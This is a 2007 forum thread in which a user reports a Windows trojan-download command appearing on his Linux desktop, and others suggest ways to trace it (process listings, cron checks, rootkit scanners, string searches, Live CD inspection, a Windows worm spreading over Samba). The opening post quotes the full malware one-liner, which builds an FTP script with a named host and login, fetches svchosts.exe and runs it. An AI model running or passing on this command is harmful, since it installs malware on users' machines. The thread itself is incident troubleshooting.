---
title: "virus running script on system"
date: 2007-03-06
forum: Server Platforms
---

### Post by timczer on 2007-03-06
I have somehow picked up what looks like a script that is trying to install a trojan on my system.  It appears to be a windows system targeted script as it tries to install an .exe file.  The following is the command it tries to run:
> ystemroot%\system32\cmd.exe												
cmd /c echo open ftp.vertinet.com 21 >> ik &echo user niki Denim7 >> ik &echo binary >> ik &echo get svchosts.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &svchosts.exe &exit												


It doesn't appear that anyone has gotten into my system, but I have two windows computers on my network as well as deal with a lot of files from work that are created on windows systems.

My question is how do I find where this is running from so I can remove it?  I would like to find the source file so I can check the windows systems on the network as well.

Any help would be appreciated.

---

### Post by kidders on 2007-03-06
Hi there,

That script would be completely meaningless to a Linux system, so you shouldn't really need to worry about what might happen if it somehow wound up being executed. Nothing would happen.

---

### Post by Mr. C. on 2007-03-07
The question is, from where do you see that line ?

MrC

---

### Post by gaten on 2007-03-07
> My question is how do I find where this is running from so I can remove it? I would like to find the source file so I can check the windows systems on the network as well.

You could try 
```
sudo ps aux
```

Then you'll have to find the offending script. 

And like the poster above said, where do you see this line? You might also contact ftp.vertinet.com's ISP and inform them that they have a user with movies, warez and possible spyware on one of their servers.

---

### Post by Mr. C. on 2007-03-07
These logs show a series of pre-canned scripts designed to hijack one system.  Until we now where that log line came from, its more difficult to help.  This type of output appears in apache's access logs frequently.

---

### Post by timczer on 2007-03-08
The script has popped up in a couple of places.  I have seen it run in the bottom of the file browser, and has run in terminal windows when I have them open.  It seems like it is running on a regular basis, but shows up when I have something open that will show text.  I had actually opened an openoffice file to do some work and the script appeared on the page so I saved it.

---

### Post by timczer on 2007-03-08
> **gaten said:**
> You could try 
```
sudo ps aux
```

Then you'll have to find the offending script. 

And like the poster above said, where do you see this line? You might also contact ftp.vertinet.com's ISP and inform them that they have a user with movies, warez and possible spyware on one of their servers.

This is the output from that command:

tim@tim-desktop:~$ sudo ps aux
Password:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   1568   532 ?        S    Mar06   0:01 init [2]
root         2  0.0  0.0      0     0 ?        SN   Mar06   0:12 [ksoftirqd/0]
root         3  0.0  0.0      0     0 ?        S    Mar06   0:00 [watchdog/0]
root         4  0.0  0.0      0     0 ?        S<   Mar06   0:00 [events/0]
root         5  0.0  0.0      0     0 ?        S<   Mar06   0:00 [khelper]
root         6  0.0  0.0      0     0 ?        S<   Mar06   0:00 [kthread]
root         8  0.0  0.0      0     0 ?        S<   Mar06   0:00 [kblockd/0]
root         9  0.0  0.0      0     0 ?        S<   Mar06   0:00 [kacpid]
root       144  0.0  0.0      0     0 ?        S    Mar06   0:00 [pdflush]
root       145  0.0  0.0      0     0 ?        S    Mar06   0:00 [pdflush]
root       147  0.0  0.0      0     0 ?        S<   Mar06   0:00 [aio/0]
root       146  0.0  0.0      0     0 ?        S    Mar06   0:04 [kswapd0]
root       734  0.0  0.0      0     0 ?        S<   Mar06   0:00 [kseriod]
root      1752  0.0  0.0      0     0 ?        S<   Mar06   0:00 [ata/0]
root      1753  0.0  0.0      0     0 ?        S<   Mar06   0:00 [ata_hotplug/0]
root      1947  0.0  0.0      0     0 ?        S<   Mar06   0:00 [khubd]
root      1956  0.0  0.0      0     0 ?        S    Mar06   0:00 [khpsbpkt]
root      1973  0.0  0.0      0     0 ?        S    Mar06   0:00 [knodemgrd_0]
root      2205  0.0  0.0      0     0 ?        S<   Mar06   0:00 [reiserfs/0]
root      2302  0.0  0.0      0     0 ?        S<   Mar06   0:00 [scsi_eh_0]
root      2303  0.0  0.0      0     0 ?        S<   Mar06   0:00 [usb-storage]
root      2305  0.0  0.0      0     0 ?        S<   Mar06   0:00 [scsi_eh_1]
root      2318  0.0  0.0      0     0 ?        S<   Mar06   0:00 [scsi_eh_2]
root      2319  0.0  0.0      0     0 ?        S<   Mar06   0:39 [usb-storage]
root      2453  0.0  0.1   2552  1040 ?        S<s  Mar06   0:00 /sbin/udevd --d
root      3363  0.0  0.0      0     0 ?        S    Mar06   0:00 [shpchpd_event]
root      4186  0.0  0.0      0     0 ?        S    Mar06   0:00 [kjournald]
root      4204  0.0  0.0      0     0 ?        S    Mar06   0:00 [kjournald]
root      4205  0.0  0.0      0     0 ?        S    Mar06   0:00 [kjournald]
root      4207  0.0  0.0      0     0 ?        S    Mar06   0:00 [kjournald]
daemon    4380  0.0  0.0   1664   352 ?        Ss   Mar06   0:00 /sbin/portmap
root      4643  0.0  0.1   2152  1188 ?        Ss   Mar06   0:00 /usr/sbin/acpid
root      4681  0.0  0.0   1680   492 ?        Ss   Mar06   0:00 /bin/dd bs 1 if
klog      4683  0.0  0.1   2424  1352 ?        Ss   Mar06   0:00 /sbin/klogd -P
104       4702  0.0  0.0   2320   896 ?        Ss   Mar06   0:27 /usr/bin/dbus-d
108       4717  0.0  0.5   7192  5788 ?        Ss   Mar06   0:16 /usr/sbin/hald
root      4718  0.0  0.1   2720  1012 ?        S    Mar06   0:00 hald-runner
108       4723  0.0  0.0   2000   788 ?        S    Mar06   0:00 /usr/lib/hal/ha
108       4774  0.0  0.0   2000   788 ?        S    Mar06   0:00 /usr/lib/hal/ha
108       4784  0.0  0.0   2004   820 ?        S    Mar06   0:03 /usr/lib/hal/ha
108       4785  0.0  0.0   2004   816 ?        S    Mar06   0:03 /usr/lib/hal/ha
108       4787  0.0  0.0   2004   816 ?        S    Mar06   0:03 /usr/lib/hal/ha
108       4788  0.0  0.0   2004   816 ?        S    Mar06   0:03 /usr/lib/hal/ha
108       4790  0.0  0.0   2008   820 ?        S    Mar06   0:03 /usr/lib/hal/ha
108       4791  0.0  0.0   2004   820 ?        S    Mar06   0:03 /usr/lib/hal/ha
108       4793  0.0  0.0   2008   820 ?        S    Mar06   0:03 /usr/lib/hal/ha
108       4794  0.0  0.0   2008   820 ?        S    Mar06   0:03 /usr/lib/hal/ha
108       4803  0.0  0.0   2004   860 ?        S    Mar06   0:02 /usr/lib/hal/ha
108       4804  0.0  0.0   2008   860 ?        S    Mar06   0:01 /usr/lib/hal/ha
root      5155  0.0  0.2  11272  2064 ?        Ss   Mar06   0:00 /usr/sbin/gdm -
root      5163  0.0  0.2  11624  2604 ?        S    Mar06   0:00 /usr/sbin/gdm -
root      5172  2.6 12.4 151872 120988 tty7    SLs+ Mar06  61:09 /usr/bin/X :0 -
hplip     5194  0.0  0.0  12876   920 ?        Ssl  Mar06   0:00 /usr/sbin/hpiod
hplip     5197  0.0  0.4   9408  4676 ?        S    Mar06   0:00 python /usr/sbi
clamav    5341  0.0  0.1   5216  1148 ?        Ss   Mar06   0:00 /usr/bin/freshc
118       5375  0.0  0.0   5220   956 ?        Ss   Mar06   0:00 /usr/sbin/exim4
root      5737  0.0  0.0   1420   320 ?        S    Mar06   0:00 /sbin/tuncfg
root      5742  0.0  0.0   3060   788 ?        S    Mar06   0:00 /usr/bin/hamach
root      5773  0.0  0.1   2640  1312 ?        S    Mar06   0:00 /bin/sh /usr/bi
mysql     5843  0.0  2.7 128600 26268 ?        Sl   Mar06   0:44 /usr/sbin/mysql
root      5844  0.0  0.0   1552   504 ?        S    Mar06   0:00 logger -p daemo
nobody    5924  0.0  0.0   1888   724 ?        Ss   Mar06   0:00 /usr/bin/no-ip
root      5945  0.0  0.1   5760  1416 ?        Ss   Mar06   0:00 /usr/sbin/nmbd
root      5948  0.0  0.2   8536  2156 ?        Ss   Mar06   0:00 /usr/sbin/smbd
root      5957  0.0  0.1   8588  1500 ?        S    Mar06   0:00 /usr/sbin/smbd
tomcat5   5961  0.0  0.1   2456   984 ?        S    Mar06   0:00 su -p -s /bin/s
tomcat5   5963  0.0  0.1   6232  1524 ?        S    Mar06   0:00 /usr/sbin/rotat
tomcat5   5970  0.0  4.2 322604 41184 ?        Sl   Mar06   1:44 /usr/lib/jvm/ja
root      6036  0.0  0.0   2212   792 ?        Ss   Mar06   0:00 /usr/sbin/xinet
root      6048  0.0  0.0   1724   700 ?        Ss   Mar06   0:00 /sbin/rpc.statd
root      6068  0.0  0.0   1624   296 ?        Ss   Mar06   0:00 /sbin/mdadm -F
daemon    6101  0.0  0.0   1800   396 ?        Ss   Mar06   0:00 /usr/sbin/atd
root      6114  0.0  0.0   2120   840 ?        Ss   Mar06   0:00 /usr/sbin/cron
tim       6137  0.0  1.0  19544  9768 ?        Ss   Mar06   0:02 /usr/bin/gnome-
root      6211  0.0  0.7  20748  6964 ?        Ss   Mar06   0:00 /usr/sbin/apach
tim       6244  0.0  0.0   4336   684 ?        Ss   Mar06   0:00 /usr/bin/ssh-ag
tim       6249  0.0  0.0   2708   644 ?        S    Mar06   0:00 /usr/bin/dbus-l
root      6284  0.0  0.0   1564   496 tty1     Ss+  Mar06   0:00 /sbin/getty 384
root      6285  0.0  0.0   1560   492 tty2     Ss+  Mar06   0:00 /sbin/getty 384
root      6286  0.0  0.0   1560   492 tty3     Ss+  Mar06   0:00 /sbin/getty 384
root      6287  0.0  0.0   1560   492 tty4     Ss+  Mar06   0:00 /sbin/getty 384
root      6288  0.0  0.0   1564   496 tty5     Ss+  Mar06   0:00 /sbin/getty 384
root      6289  0.0  0.0   1564   496 tty6     Ss+  Mar06   0:00 /sbin/getty 384
tim       6290  0.0  0.0   2192   960 ?        Ss   Mar06   0:00 dbus-daemon --f
tim       6303  0.0  0.4   6764  4384 ?        S    Mar06   0:02 /usr/lib/libgco
tim       6304  0.0  0.3  20748  3880 ?        S    Mar06   0:00 /usr/sbin/apach
tim       6305  0.0  0.3  20748  3880 ?        S    Mar06   0:00 /usr/sbin/apach
tim       6306  0.0  0.3  20748  3880 ?        S    Mar06   0:00 /usr/sbin/apach
tim       6307  0.0  0.3  20748  3880 ?        S    Mar06   0:00 /usr/sbin/apach
tim       6308  0.0  0.3  20748  3880 ?        S    Mar06   0:00 /usr/sbin/apach
tim       6310  0.0  0.0   2340   736 ?        S    Mar06   0:00 /usr/bin/gnome-
tim       6312  0.0  0.3   6400  3148 ?        Ss   Mar06   0:00 /usr/lib/bonobo
tim       6315  0.0  0.9  27524  8944 ?        Sl   Mar06   0:12 /usr/lib/contro
tim       6317  0.0  0.6  17252  6480 ?        S    Mar06   0:03 /usr/lib/vino/v
tim       6319  0.0  0.9  15844  9696 ?        Ss   Mar06   1:10 /usr/bin/metaci
tim       6330  0.0  2.8  50944 27396 ?        Ssl  Mar06   0:52 gnome-panel --s
tim       6332  0.3  3.0  95104 29964 ?        Ssl  Mar06   7:58 nautilus --no-d
tim       6337  0.0  0.3   8636  3884 ?        Sl   Mar06   0:01 /usr/lib/gnome-
tim       6344  0.0  1.1  35272 11532 ?        Ss   Mar06   0:05 update-notifier
tim       6345  0.0  0.6  18828  6604 ?        Ss   Mar06   0:37 gnome-volume-ma
tim       6353  0.0  0.8  17892  8064 ?        S    Mar06   0:03 /usr/bin/gpilot
tim       6355  0.0  2.1  56812 20400 ?        Ssl  Mar06   0:06 drapes /usr/lib
tim       6359  0.0  1.0  40544  9912 ?        Ssl  Mar06   0:38 tilda
tim       6372  0.0  0.9  19008  9388 ?        S    Mar06   0:04 /usr/lib/gnome-
tim       6382  0.2  4.1  87316 40184 ?        Ss   Mar06   4:36 gnome-cups-icon
tim       6385  0.0  0.7  18052  6996 ?        S    Mar06   0:03 /usr/bin/gpilot
tim       6397  0.0  0.0   2280   796 ?        S    Mar06   0:00 /usr/lib/nautil
tim       6398  0.0  0.5  17768  5428 ?        Ss   Mar06   0:03 gnome-power-man
tim       6414  0.0  1.1  36256 11392 ?        S    Mar06   0:04 /usr/lib/gnome-
tim       6416  0.0  1.0  23220 10284 ?        S    Mar06   0:03 /usr/lib/gnome-
tim       6425  0.0  1.0  68380 10376 ?        Sl   Mar06   0:03 /usr/lib/gnome-
tim       6427  0.0  0.8  33776  8616 ?        S    Mar06   0:02 /usr/lib/gnome-
tim       6439  0.0  0.0   2280   676 ?        S    Mar06   0:00 gnome-pty-helpe
tim       6449  0.0  0.3   5820  3504 pts/0    Ss+  Mar06   0:00 /bin/bash
tim       6491  0.0  0.5  15092  5340 ?        Ss   Mar06   0:17 gnome-screensav
root      6750  0.0  1.3  40340 13208 ?        Ss   Mar06   0:16 x11vnc -inetd -
tim      15239  0.0  0.1   4180  1688 ?        S    Mar06   0:00 /bin/sh /usr/bi
tim      15243  0.0  0.1   4220  1720 ?        S    Mar06   0:00 /bin/sh /usr/li
tim      15248  0.3  7.4 170136 72388 ?        Sl   Mar06   7:16 /usr/lib/mozill
tim      22182  0.3 11.4 209628 111356 ?       Sl   Mar06   6:31 amarok
tim      22189  0.0  0.8  25228  8172 ?        Ss   Mar06   0:00 kdeinit Running
tim      22193  0.0  0.7  24432  7088 ?        S    Mar06   0:00 dcopserver [kde
tim      22195  0.0  0.8  25812  8692 ?        S    Mar06   0:00 klauncher [kdei
tim      22197  0.0  1.2  28464 12240 ?        S    Mar06   0:07 kded [kdeinit]
tim      22200  0.0  0.1   2732  1432 ?        S    Mar06   0:03 /usr/lib/gamin/
tim      22241  0.0  0.2   3684  2320 ?        S    Mar06   0:00 ruby /usr/share
tim      22242  0.0  0.3   5156  3740 ?        S    Mar06   0:00 ruby /usr/share
tim      30616  0.0  0.9  26900  8808 ?        S    Mar06   0:00 kio_file [kdein
tim      31750  0.0  1.5  74568 15364 ?        Sl   Mar06   0:11 /usr/lib/evolut
tim      31762  0.0  1.0  57720  9768 ?        Sl   Mar06   0:01 /usr/lib/evolut
root     22470  0.0  0.4   7904  4340 ?        Ss   Mar07   0:00 Xvnc -inetd :1
root     22471  0.0  0.2  11624  2388 ?        S    Mar07   0:00 /usr/sbin/gdm -
gdm      22476  0.0  1.3  20460 12816 ?        Ss   Mar07   0:01 /usr/lib/gdm/gd
tim      14126  0.0  0.9  32444  9500 ?        S    Mar07   0:06 /usr/lib/notifi
root      8922  0.0  1.3  40460 13200 ?        Ss   Mar07   0:17 x11vnc -inetd -
cupsys   15356  0.1  0.2   4488  2180 ?        SNs  07:37   0:05 /usr/sbin/cupsd
syslog    3934  0.0  0.0   1768   712 ?        RNs  07:41   0:00 /sbin/syslogd -
root      6436  0.0  0.0      0     0 ?        S<   08:16   0:00 [scsi_eh_4]
root      6437  0.0  0.0      0     0 ?        S<   08:16   0:00 [usb-storage]
108       6480  0.0  0.0   2008   816 ?        S    08:16   0:00 /usr/lib/hal/ha
108       6482  0.0  0.0   2008   816 ?        S    08:16   0:00 /usr/lib/hal/ha
tim       7031  0.0  0.1   4176  1684 ?        S    08:22   0:00 /bin/sh /usr/bi
tim       7042  0.0  0.1   4216  1712 ?        S    08:22   0:00 /bin/sh /opt/fi
tim       7047 26.0  9.1 185204 88392 ?        Sl   08:22   3:33 /opt/firefox/fi
tim       7066  0.0  0.0      0     0 ?        Z    08:22   0:00 [net] <defunct>
tim       7899  9.5  1.4  33072 13632 ?        Sl   08:35   0:01 gnome-terminal
tim       7905  0.0  0.0   2280   676 ?        S    08:35   0:00 gnome-pty-helpe
tim       7906  1.7  0.3   5840  3528 pts/1    Ss   08:35   0:00 bash
root      7934  1.3  0.1   2396  1020 pts/1    R+   08:36   0:00 ps aux


Do any of these look like that kind of script (I am not sure which are normal, and what an offending script would look like.  Thanks

---

### Post by Mr. C. on 2007-03-08
I can't tell from your description, exactly what is going on.  It clear that a) your system has been compromised in some fashion, and b) malware of some sort is running.

If your system has been compromised using some of the various rootkits available, you may have a difficult time finding and resolving it.  Your option will be to reinstall the system.

Text output just doesn't appear in random dialog boxes, and screens in Unix/Linux, and I'm not going to even start to explain why.

So, if you are seeing this script apparently *typing* itself in any text entry area, this could account for your interpretation of it "popping up".  Without a more accurate description, the problem can't be more accurately diagnosed.

Your output from ps is abbreviated, and hence missing important information.  Use ps -elf instead.  However, this is unlikely to uncover anything, as most the script is probably run periodically, not constantly.  There may be some cron task running, say, every few minutes, or hours.  Check your cron tasks, watch top -d 1, install and run rkhunter, do a find to search every file for the site mentioned in the script.

I could spend the time trying to explain how to diagnose and rid your self of this pest, but the bigger question is - why did you get infected in the first place! ?

My guess, it is one or more of a) no firewall, b) browsing to less-than-reputable places, c) shareware, warez, peer-to-peer, various IRC channels, installing without understanding, etc.  If this is correct (and you have to be honest here), then there's little point in fixing your system, as it will likely become compromised again very soon after, until you change your online habits.

MrC

---

### Post by aquadeluxe on 2007-03-08
yea...im on a mac and it did that to me.

i was just typing to my friend and it was randomly typing that....... it was REALLY weird. the username and password are correct to that ftp server also....

---

### Post by Mr. C. on 2007-03-08
For both of you who have infected systems, please disconnect from the internet until you have that under control!  You are allowing your systems are act as bot's, sending out malware, and likely infecting other systems.

Please get this under control !
MrC

---

### Post by aquadeluxe on 2007-03-08
how could it be working though, it was typing in windows commands, so it wouldn't work with commands on a mac(which is what i am on)... or linux..

---

### Post by Mr. C. on 2007-03-08
> **aquadeluxe said:**
> how could it be working though, it was typing in windows commands, so it wouldn't work with commands on a mac(which is what i am on)... or linux..

You don't know exactly what "it" is doing, now do you ?

---

### Post by aquadeluxe on 2007-03-08
i can look in my activity monitor, which shows all the processes that are running, and i don't see anything taking up many resources at all...

plus if it is doing something weird, what would i do to disable/delete it?

---

### Post by Mr. C. on 2007-03-08
No, you cannot.  One can only see a momentary glimpse into what's happening on the system at that moment.  A dozen quick processes can come and go and you will never know.  Ps, top, and all the other stuff will not show you every processes, and it would take too long to explain why.

If you want to stop the problem, you have to accept that your system has been compromised, and decide you are going to fix that.

The answer may be that *you* won't be able to fix it, because you may not have enough (and no insults intended) know-how or experience, to uncover what is going on.

There are many different ways processes can be started on the system, and many different ways for them to hide themselves.  If you've been root-kitted, its most likely game over for that system.

Until you uncover a) what is being sent out over the network (eg. packet trace), and b) what system files have been compromised, and c) what new processes are running or configured to be run by the system periodically, you will not know that anything you do is effective.

Once systems become compromised, most users have little-to-no hope of fixing the system - get out the reinstallation disks and reinstall.

And practice safe computing !
MrC

---

### Post by aquadeluxe on 2007-03-08
Well...I really don't want to reinstall.... but I just might..:( 

It is kinda weird that this happened...

Although this isn't a Mac forum, would you recommend any anti-virus software? I have Ubuntu installed on another partition. Is there anyway using that to find this possible root-kit?

The computer doesn't seem that it is running slow or anything, other than usual. I did notice once, though, that when downloading ANY file on the internet, it would always go at a limited speed. When I did a bandwidth test, it looked normal, but it was still going slow. I did yet another test, and it started going really slow... I guess this could just be doing stuff that was using my internet resources...

The supposed root-kit tried to connect an ftp server at ftp.ventinet.com . When I went to ventinet.com, it was some weird russian site... It looked harmless. I went to that after this was doing what it was doing.

sorry for the rant-ish post......

---

### Post by Mr. C. on 2007-03-08
No problem, I understand your frustration and despair.  My tone is to point out how problematic this stuff is.

As to advice about A/V, there's not much problem using *nix system; rather, its more a matter of how you use your system.

I use this analogy because it is effective.  Asking what brand of X or Y anti-malware to purchase is like asking what brand of prophylactic to purchase before you next trip to a house of ill-repute.

Here's the lesson in networked computing: there are millions of infected systems, websites, p2p networks, IRC channels, etc. just waiting for you to visit.  And they'll leave you with a very nasty parting gift.

If your system is important to you, treat it as such.

MrC

---

### Post by timczer on 2007-03-09
As for my situation, I am running a firewall, run through a router with hardware firewall.  I don't do irc channels, don't surf to very many sites, and those I do are reputable sites.  I think, overall, that I try to be pretty secure with my system (not perfect, but decent security).

I do have a windows box on my network that my son uses, and He has done some p2p stuff in the past.  Could this script have migrated from that system to my box?

I have run rkhunter, chkrootkit, and clamav on the sytem and have detected nothing.  I have done a file search looking for that text string, and have come up with nothing.  

I have a fairly complex system setup that I have come to over running dapper for quite a while, and use it for work.  I would like to try to run down the offending program before I have to go through the extreme pain of reinstalling everything.  Any help in running down this script would be appreciated.  Thanks.

---

### Post by melancholeric on 2007-03-09
[http://www3.ca.com/securityadvisor/virusinfo/virus.aspx?ID=46981](http://www3.ca.com/securityadvisor/virusinfo/virus.aspx?ID=46981)

It must have come from that windows box. I'm actually more interested on how exactly the script (obviously written for windows) can run on linux. I'm trying to find more info on it.

---

### Post by jfdill_2 on 2007-03-09
> **timczer said:**
> I have done a file search looking for that text string, and have come up with nothing.

It sounds to me like it may be getting executed from one of the shell profile files somewhere.

Did you check in the /etc directory?

Did you check in your home directory "dot" files?

Maybe try something like this:

```
cat << EOF > /tmp/strings.txt
cmd.exe
ftp.vertinet.com
Denim7
svchosts.exe
EOF
find ~/.[a-zA-Z]* -type f -exec fgrep -f /tmp/strings.txt -l {} \;
sudo find /etc -type f -exec fgrep -f /tmp/strings.txt -l {} \;
sudo find /var/spool -type f -exec fgrep -f /tmp/strings.txt -l {} \;
```

Another possibility is that it is getting run from a scheduled task such as cront or atd.

Another possiblity is that the command is being submitted via a mechanism such as rexec, rsh, or some kind of remote control.  None of those services should be installed or enabled by default, but perhaps you set it up at some point then forgot about it?

Try installing nmapfe and scan your local machine to see if any unusual ports are open.

Try installing iftop, etherape see if there is any measurable network activity that looks unusual.  Try installing and running wireshark to see if there is any unusual network traffic, although making sense of packet traces takes a trained eye.

---

### Post by melancholeric on 2007-03-09
[http://www.trendmicro.com/vinfo/virusencyclo/default5.asp?VName=WORM_MYTOB.OJ&VSect=T](http://www.trendmicro.com/vinfo/virusencyclo/default5.asp?VName=WORM_MYTOB.OJ&VSect=T)

 Network Propagation and Exploit

This worm spreads through network shares. It searches for certain shares, where it drops a copy of itself. It uses a list of user names and passwords to gain access to password-protected shares.
It also takes advantage of the Windows LSASS vulnerability to propagate across the network. The mentioned vulnerability is discussed in detail on the following Web page:

[http://www.microsoft.com/technet/security/bulletin/MS04-011.mspx](http://www.microsoft.com/technet/security/bulletin/MS04-011.mspx)

So, the windows box is infected, and it's trying to get to your box via the network.

---

### Post by jfdill_2 on 2007-03-09
A few more thoughts:

The "right" way to examing your system is to boot the system from a Live CD such as the Ubuntu Live CD then mount your partitions to examine them "forensically".  The shell of the installed system may have been compromised to "hide" the malware so that you can't "see" it with the tools that are on the system i.e. a "rootkit" replaces tools such as ls, ps, find with tools that filter out any output that would reveal the malicious software.

If you use the Ubuntu Live CD, you will probably have to set up networking from the Live CD then install software that you want to use such as clamav.  Alternatively, there are several good Linux Live CDs that already contain these types of utilities, but they work a bit differently from Ubuntu and may take some getting used to depending on your level of experience with Linux.

A good Live CD that I have used on occassion is [Local Area Security]("http://www.localareasecurity.com/") (L.A.S.)

Do you have any Samba shares on the system?  Or does your Linux box connect to any Samba shares?

It looks very common for many Windows worms to drop malicious svchosts.exe onto network shares, the worms don't care if those shares are real Windows or happen to be Samba.  Just looking quickly in Google, this includes several variants of MyTob, Agobot, Forbot, there are too many to list all of them or try to identify it without more specific information.

---

### Post by Mr. C. on 2007-03-09
As you are discovering, and as this increasing length of this thread demonstrates, diagnosis is very difficult.  The vast majority of infected users have no idea how to diagnose the situations, let alone *ensure* a remedy.

The difficulty isn't finding some script (that's the easy part).  The difficulty is finding out *how* it arrived in the first place, what compromises have been made, and how to verify that every trace of the malware has been eradicated.  Some of the rootkits available are essentially impossible for a novice to uncover.

MrC

---

### Post by melancholeric on 2007-03-09
> **Mr. C. said:**
> As you are discovering, and as this increasing length of this thread demonstrates, diagnosis is very difficult.  The vast majority of infected users have no idea how to diagnose the situations, let alone *ensure* a remedy.

The difficulty isn't finding some script (that's the easy part).  The difficulty is finding out *how* it arrived in the first place, what compromises have been made, and how to verify that every trace of the malware has been eradicated.  Some of the rootkits available are essentially impossible for a novice to uncover.

MrCIt doesn't really look that hard to diagnose. The thing is, nobody is really even trying.

[http://www.trendmicro.com/vinfo/virusencyclo/default5.asp?VName=WORM_MYTOB.OJ&VSect=T](http://www.trendmicro.com/vinfo/virusencyclo/default5.asp?VName=WORM_MYTOB.OJ&VSect=T)  

Or, google for svchosts.exe. And while you're at it, care to explain how exactly a .exe file could possibly infect a linux machine? Unless you use wine, of course. 

( for the record, I visited the ftp site in the script and downloaded the file. 
$ file svchosts.exe
svchosts.exe: MS-DOS executable PE  for MS Windows (GUI) Intel 80386 32-bit )

The script that's trying to run on the system is an obvious windows script too. "%systemroot%\system32\cmd.exe" is the path to the windows command line.

And since a/ he is in the same network with a windows box, and b/ there is a known windows worm that uses a file called svchosts.exe that tries to propagate via network, I think it can be safely concluded that this is it. 

All he needs to do now is to scan the windows machine with a decent antivirus. If that doesn't show anything and the problem persists, then we can start talking about rootkits again.

---

### Post by Mr. C. on 2007-03-09
You are missing the point entirely.  I KNOW how the script works, and what it does.  This trash has been around for a while now.

The point isn't fixing this one script - it is ensuring that ALL of the holes are covered.  Consider it this way, when your house gets burglarized, do you stop determining what is missing when you detected the first missing item?

MrC

---

### Post by melancholeric on 2007-03-09
> **Mr. C. said:**
> You are missing the point entirely.  I KNOW how the script works, and what it does.  This trash has been around for a while now.

The point isn't fixing this one script - it is ensuring that ALL of the holes are covered.  Consider it this way, when your house gets burglarized, do you stop determining what is missing when you detected the first missing item?

MrC

And that's why I told him to scan the windows machine. I think you told him to reinstall.

Oh, and check cron tabs, run  rootkit detectors et cetera. Not that rootkit detectors ever a bad idea per se, but utterly useless against this.

---

### Post by Mr. C. on 2007-03-09
melancholeric,

Your excellent understanding of these issue will perhaps allow you to explain to the OP what is running on his Linux system that is causing all of his observations:

> 
* The script has popped up in a couple of places.
* I have seen it run in the bottom of the file browser, 
* and has run in terminal windows when I have them open.
* It seems like it is running on a regular basis,
* shows up when I have something open that will show text.
* I had actually opened an openoffice file to do some work and the script appeared on the page so I saved it.


---

### Post by melancholeric on 2007-03-09
> **Mr. C. said:**
> melancholeric,

Your excellent understanding of these issue will perhaps allow you to explain to the OP what is running on his Linux system that is causing all of his observations:

Well, since you said, in your own words, "I KNOW how the script works, and what it does.", why don't you tell me.

And while you're at it, why don't you also explain why someone would compromise a linux box (and a mac) to try to use a windows script to download and run a windows exe file on it. Or, compromise it and then display that message occasionally to the user. I thought rootkits try to make themselves impossible to detect and notice.

Now, if that worm propagates through smb, it's not much of a stretch to think it might be able to pass the authentication and be able to attempt to enter commands (which then show up as plain text) on the linux box. To me that's far more believable than an actual rootkit. Not that I know for sure. 

But I'd still start from scanning the windows machine for viruses, instead of reinstalling linux (which I think was your suggestion).

---

### Post by Mr. C. on 2007-03-09
There is no point in discussing such issues with someone that does not want to learn and understand.

Best of luck,
MrC

---

### Post by melancholeric on 2007-03-09
Alright. I gave this a second thought. Also, I'd like to apologize for some of my comments, I think they were uncalled for and more or less based on miscommunication.

I didn't actually even consider the possibility that there are two, separate, issues, one being the script associated with the exe file, and another issue -- a vulnerability in the linux box that somehow lets the script in.

But given that this occured on a mac too, this doesn't really seem likely either.

Actually, I'm not sure what to think of this at all. Other than getting an antivirus to the windows box, but that goes without saying.

---

### Post by Mr. C. on 2007-03-09
You're a good (wo)man !

Here's the issue.  There are hundreds to thousands of cross-platform, javascript, cross-site, etc.  attacks.  It could be, and is likely, that the OP uses the same browser on these systems (or has).  All it takes is one web visit to invoke a script that installs any piece of code (payload) it wants.  From keyloggers, to worms, viruses, etc.  All malware.

The toolkits today to create malware have become very sophisticated, and no longer target single platforms.  And they are *readily* available, found, and deployed.

If I were to write such a package, I would make sure it a) was cross-platform b) targeted the weakest links (inexperienced net/OS users), c) utilized as many forwarding methods as possible, d) hide itself well, and e) was polymorphic in nature, and more.

I could easily write a piece of software that placed a backdoor in your linux system, and get it deployed should you initiate the action, and you would likely never know. All it takes is just one visit.

I aim to educate, not be alarmist.  The dangers are real.

Cheers,
MrC

---

### Post by melancholeric on 2007-03-09
> All it takes is one web visit to invoke a script that installs any piece of code (payload) it wants.
Got any examples of such? Even proof-of-concept?

I'm not saying they don't exist, or that it's impossible. But those can't be awfully common given how little attention they generally get.

> I could easily write a piece of software that placed a backdoor in your linux system, and get it deployed should you initiate the action, and you would likely never know. All it takes is just one visit.
Please do. I for one would be very interested on the exact vulnerabilities it'd exploit. And I imagine many others, including the developers of the vulnerable software would be too.

Cross-site scripting is one thing, and yeah, those are (usually) about as platform independent as possible. But there's a long way to rootkit from there.

About actual suggestions on the opening post, and rootkit detection in general: what about booting from a liveCD, mounting the filesystem, and doing an md5sum check on critical binaries on both; the ones on the harddrive and the ones on the CD? That's assuming that the binaries haven't been upgraded since install, and that they're actually supposed to be identical.

ps, top, pstree, and others.

---

### Post by Mr. C. on 2007-03-10
I'm not going to continue to debate this with you.  It is pointless.

---

### Post by timczer on 2007-03-10
Sorry, I have been away from my own post for a while, darn work and kids.  I will try some of the suggestions mentioned throughout the thread tomorrow and see what I find.

I have not seen the script running anywhere for the last day or two.  This is strange as that coincides with the when I disconnected my laptop from the network (I have a windows laptop from work that I sometimes connect into my home network to transfer files). 

This script issue seems to have started around the same time that I installed a vpn on my laptop.  The software is from my Company's IT company.  I needed a vpn to connect to the company's network in order to connect to remote locations to work on their computer systems on site.  I had been active in using the vpn when the script started running, then for the last day or so I had the laptop off the network as I was taking it to work.  

Although the company is supposed to have a very secure network, is it possible the script came from there?  If so, which of the suggested procedures (if any) would allow me to determine if this is the case?  Obviously, if this were so, it would be of great concern for the company as we have a number of computers on the network.

---

### Post by Mr. C. on 2007-03-11
No problem; it sounds like you are narrowing down the possibilities.

Secure networks typically indicates that unsolicited outsiders are denied incoming access.   However, it is very difficult to prevent malicious activity when the insiders initiate the connection. 

Insiders are almost always the worst (ab)users of a network.  No matter how secure the inside, employees generally do what they please, irrespective of company policy.  Despite all measures to provide a secure network, I found my last client's employees were very creative at finding ways to overwhelm their systems with spyware, viruses, and worms.  One character had 148 viruses on his system... and the CEO wondered why he was taking so long to get work done, and why the network had crawled to a snail's pace!

Its hard to say what's going on with your system.  Keep plucking away at the layers until you isolate it as much as possible.  Let's hope its a trivial matter to clear up.

Best of luck,
MrC

---

### Post by jnorth on 2007-03-13
Interesting thread, seeing as how I received an email today from 3 different people running Ubuntu (one Kubuntu too) saying exactly the same thing - "there's a pop up that's typing by itself".

